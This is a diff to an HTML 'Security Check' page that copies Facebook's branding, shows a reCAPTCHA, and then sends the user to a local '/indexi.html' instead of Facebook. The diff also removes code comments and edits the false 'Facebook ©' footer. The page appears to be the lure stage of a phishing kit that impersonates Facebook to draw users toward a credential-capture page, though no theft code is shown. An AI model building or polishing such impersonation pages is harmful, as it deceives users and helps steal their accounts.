@@ -20,8 +20,10 @@
       box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
       border-radius: 8px;
       padding: 20px;
-      width: 400px;
+      width: 100%;
+      max-width: 400px;
       text-align: center;
+      box-sizing: border-box;
     }
     h1 {
       color: #1877f2;
@@ -33,6 +35,11 @@
       font-size: 16px;
       margin-bottom: 20px;
     }
+    .g-recaptcha {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
     button {
       padding: 12px 20px;
       font-size: 16px;
@@ -41,7 +48,6 @@
       border: none;
       border-radius: 6px;
       cursor: pointer;
-      margin-top: 20px;
     }
     button:disabled {
       background-color: #bcc0c4;
@@ -60,25 +66,21 @@
     <h1>Security Check</h1>
     <p>Please confirm you're not a robot to continue to Facebook.</p>
 
-    <!-- reCAPTCHA Widget -->
     <div class="g-recaptcha" data-sitekey="6Lex_SArAAAAABRopN4ZMc1wJDMyIGCQhW4whcI1" data-callback="recaptchaSuccess"></div>
 
-    <!-- Proceed Button -->
     <button id="proceedBtn" disabled>Proceed to Facebook</button>
 
     <footer>
-      Facebook © 2025. All rights reserved.
+      Facebook © 2024. All rights reserved.
     </footer>
   </div>
 
   <script>
     function recaptchaSuccess(token) {
-      // Token can be verified on the backend if needed
       document.getElementById("proceedBtn").disabled = false;
     }
 
     document.getElementById("proceedBtn").addEventListener("click", function () {
-      // Redirect to Facebook or your target page
       window.location.href = "/indexi.html";
     });
   </script>
